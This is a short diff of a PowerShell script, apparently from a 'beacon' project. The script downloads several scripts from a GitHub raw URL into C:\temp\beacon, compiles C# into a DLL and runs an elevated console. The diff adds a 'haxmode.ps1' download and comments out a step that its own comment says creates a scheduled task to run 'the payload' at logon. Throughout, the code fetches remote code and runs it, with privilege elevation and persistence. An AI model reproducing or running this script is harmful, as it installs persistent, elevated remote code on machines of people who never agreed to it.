@@ -15,12 +15,13 @@ Invoke-Restmethod -Uri https://raw.githubusercontent.com/snackmasta/beacon/maste
 Invoke-Restmethod -Uri https://raw.githubusercontent.com/snackmasta/beacon/master/GetState.ps1 > C:\temp\beacon\GetState.ps1
 Invoke-Restmethod -Uri https://raw.githubusercontent.com/snackmasta/beacon/master/task.ps1 > C:\temp\beacon\task.ps1
 Invoke-Restmethod -Uri https://raw.githubusercontent.com/snackmasta/beacon/master/TCPState.ps1 > C:\temp\beacon\TCPState.ps1
+Invoke-Restmethod -Uri https://raw.githubusercontent.com/snackmasta/beacon/master/haxmode.ps1 > C:\temp\beacon\elevate\haxmode.ps1
 
 # Compile the C# source code into a DLL
 C:\temp\beacon\elevate\compile.ps1
 
-# Create a scheduled task to run the payload at logon
-C:\temp\beacon\task.ps1
+# # Create a scheduled task to run the payload at logon
+# C:\temp\beacon\task.ps1
 
 # Execute the elevated console
 C:\temp\beacon\elevate\Elevate.ps1
